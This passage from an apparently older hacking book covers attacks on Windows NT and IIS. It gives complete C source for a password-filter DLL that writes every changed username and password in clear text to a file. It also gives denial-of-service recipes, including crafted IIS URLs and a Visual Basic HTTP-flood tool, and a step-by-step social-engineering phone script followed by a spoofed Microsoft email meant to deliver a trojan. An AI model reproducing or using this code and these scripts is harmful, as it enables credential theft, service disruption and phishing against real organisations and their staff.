
## Searching the Registry

![](img/ba85bb40c695c02adae8cbd6666f2e0c_579_0.png)

**Figure 10.7** Searching the Registry.

Modified to store passwords via clear text in a predetermined file, such as `C:\temp\pwdchange.out`, as indicated in the following excerpt:

```c
fh = CreateFile("C:\temp\pwdchange.out",
fpnwclnt.c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

struct UNI_STRING {
USHORT len;
USHORT maxlen;
WCHAR *buff;
};
static HANDLE fh;

BOOL __stdcall InitializeChangeNotify ()
{
DWORD wrote;
fh = CreateFile("C:\temp\pwdchange.out",
GENERIC_WRITE,
FILE_SHARE_READ|FILE_SHARE_WRITE,
NULL,
CREATE_ALWAYS,
FILE_ATTRIBUTE_NORMAL|FILE_FLAG_WRITE_THROUGH,
NULL);
WriteFile(fh, "InitializeChangeNotify started\n", 31, &wrote, 0);
return TRUE;
}

LONG __stdcall PasswordChangeNotify (
struct UNI_STRING *user,
ULONG rid,
struct UNI_STRING *passwd
)
{
DWORD wrote;
WCHAR wbuf[200];
char buf[512];
char buf1[200];
DWORD len;

memcpy(wbuf, user->buff, user->len);
len = user->len/sizeof(WCHAR);
wbuf[len] = 0;
wcstombs(buf1, wbuf, 199);
sprintf(buf, "User = %s : ", buf1);
WriteFile(fh, buf, strlen(buf), &wrote, 0);

memcpy(wbuf, passwd->buff, passwd->len);
len = passwd->len/sizeof(WCHAR);
wbuf[len] = 0;
wcstombs(buf1, wbuf, 199);
sprintf(buf, "Password = %s : ", buf1);
WriteFile(fh, buf, strlen(buf), &wrote, 0);

sprintf(buf, "RID = %x\n", rid);
WriteFile(fh, buf, strlen(buf), &wrote, 0);

return 0L;
}
```

## System Crashing

### Severe Denial-of-Service Attack

**Synopsis:** ASCII transmission via telnet can confuse standard service daemons and cause severe congestion.

**Hack State:** Complete service denial.

**Vulnerabilities:** Win NT.

**Breach:** Hackers simulate simple telnet procedures to ports 53 and/or 1031 to cause 100 percent CPU utilization, denying all client services and requiring a system restart. Telnetting to an NT server with active ports 53 and/or 1031, and transferring random characters, can cause severe CPU congestion (as shown in Figure 10.8).

This particular attack has made the Underground cloak-and-dagger list, as it has been used to harass countless corporate Web servers, especially those running the domain name service (DNS). Among the obvious DoS side effects, the attack can also cause the system log file to fill up with thousands of error messages, as shown in Figure 10.9.

### Severe Denial-of-Service Attack

**Synopsis:** Custom URL scripts can confuse the Win NT Internet Information Server (IIS) service daemon and cause service denial.

**Hack State:** Complete service denial.

**Vulnerabilities:** Win NT IIS, version 3, 4, 5.

**Breach:** From a Web browser, hackers send custom URL scripts that attack a specific application service, in this case newdsn.exe, resulting in access violation that ultimately crashes the IIS service. Upon execution, the victim may receive the famous Dr. Watson application error with very little resource degradation (as shown in Figure 10.10).

![](img/ba85bb40c695c02adae8cbd6666f2e0c_581_0.png)

**Figure 10.8** Hacking Windows NT with telnet.

![](img/ba85bb40c695c02adae8cbd6666f2e0c_582_0.png)

![](img/ba85bb40c695c02adae8cbd6666f2e0c_582_1.png)

**Figure 10.9** DoS implications of the telnet hack attack.

![](img/ba85bb40c695c02adae8cbd6666f2e0c_582_2.png)

**Figure 10.10** Dr. Watson to the rescue.

At this point, IIS could immediately crash, or crash upon scheduled administrative service interruptions—essentially, upon administrative shutdown and/or service restart. The destructive requests include the following URLs:

- www.victim.com/Scripts/Tools/Newsdn.exe?Createdatabase
- www.victim.com/Scripts/Tools/Newsdn.exe?Create

### Severe Congestion

**Synopsis:** Custom HTTP request saturation can cause severe resource degradation.

**Hack State:** CPU congestion.

**Vulnerabilities:** Win NT 3x, 4, and Internet Information Server version 3, 4, 5.

**Breach:** Using a simple underground IIS attack software module (see Figure 10.11) that has been programmed for an unlimited hit count, a remote attacker can cause severe CPU congestion, resulting in resource degradation and, ultimately, potential service denial. The program shown here was written in Visual Basic and includes only a single form (see Figure 10.12).

![](img/ba85bb40c695c02adae8cbd6666f2e0c_583_0.png)

![](img/ba85bb40c695c02adae8cbd6666f2e0c_583_1.png)

```vb
main.frm Private Stopper&
Private Sub Command1_Click()
On Error GoTo ErrorHandler
If Command1.Caption = "begin" Then
    If IsNumeric(Text2.Text) = False Then
        MsgBox "Please enter a valid amount!", vbExclamation, "" : Text2.Text = "0" : Exit Sub
    Command1.Caption = "stop"
    Text3.Visible = True
    For a = 1 To Text2.Text
        If Stopper& = 1 Then Exit Sub
        Do While Inet1.StillExecuting
            DoEvents
        Loop
        Inet1.Execute Text1.Text, "GET " & Text1.Text
        Text3.Text = Text3.Text + 1
    Next a
Else
    Stopper& = 1
    Command1.Caption = "begin"
    Text3.Visible = False
End If
Exit Sub
ErrorHandler:
MsgBox "Please enter a valid web server!", vbInformation, ""
Exit Sub
End Sub
```

## System Control

The purpose of this section is to re-create a common system control attack on Win NT servers. Attacks like this one against IT staff happen almost everyday. For simplicity, this hack is broken into a few effortless steps:

### Step 1: The Search

In this step, the attacker chooses an IT staff victim. Whether the attacker already knows the victim or searches the victim’s company Web site, it takes very little effort to perform some social engineering to reveal a target email address. Remarkably, some sites actually post IT staff support email addresses, and more remarkably, individual names, addresses, and even photos.

This sample social engineering technique was like taking candy from a baby:

- **Hacker:** “Good morning; my name is Joe Hacker from Microsoft. Please transfer me to your IT department. They are expecting my call as I am responding to a support call, ticket number 110158.”
- **Reception:** “Oh, okay. Do you have the name of the person you are trying to reach?”
- **Hacker:** “No, sorry... The caller didn’t leave a name... wait, let me check... (sound of hacker typing on the keyboard). Nope, only this contact number.”
- **Reception:** “I’ll transfer you to Tom; he’s in IT. He’ll know who to transfer you to.”
- **Tom:** “Hello?”
- **Hacker:** “Good morning, Tom; my name is Joe Hacker, from Microsoft support. I’m responding to a support call, ticket number 110158, and I’m making this call to put your staff on our automated NT security alert list.”
- **Tom:** “Whom were you trying to reach?”
- **Hacker:** “Our terminals are down this morning, all I have is this contact number. All I need is an IT staff email address to add to our automated NT security alert list. When new patches are available for any substantiated NT vulnerabilities, the recipient will receive updates. Currently, three new patches are available in queue. Also…” (interrupted)
- **Tom:** “Cool; it’s a pain trying to keep up with these patches.”
- **Hacker:** “It says here your primary Web server is running IIS. Which version is it?”
- **Tom:** “Believe it or not, it’s 3.0. We’re completely swamped, so we’ve put this on the back burner. You can use my address for the advisories; it’s tom.fooled@victim.com.”
- **Hacker:** “Consider it done, ticket closed. Have a nice day.”

### Step 2: The Alert

During this step, the attacker decides on the remote-control daemon and accompanying message. In this particular case, the attacker chose phAse Zero:

**Port:** 555, 9989

**Service:** Ini-Killer, NeTAdmin, phAse Zero, Stealth Spy

**Hacker’s Strategy:** Aside from spy features and file transfer, the most important purpose of these Trojans is to destroy the target system. The only saving grace is that these daemons can only infect a system upon execution of setup programs that need to be run on the host.

Using a mail-spoofing program, as mentioned earlier in this book, the attacker’s message arrived (spoofed from Microsoft):

```
>On 10 Oct 2000, at 18:09, support@microsoft.com wrote:
>
>Issue
>
>======
>
>This vulnerability involves the HTTP GET method, which is used to obtain
>
>information from an IIS Web server. Specially malformed GET requests can
>
>create a denial-of-service situation that consumes all server resources,
>
>causing a server to “hang.” In some cases, the server can be put back into
>
>service by stopping and restarting IIS; in others, the server may need to
>
>be rebooted. This situation cannot happen accidentally. The malformed GET
>
>requests must be deliberately constructed and sent to the server. It is
>
>important to note that this vulnerability does not allow data on the
>
>server to be compromised, nor does it allow any privileges on it to be usurped.
```
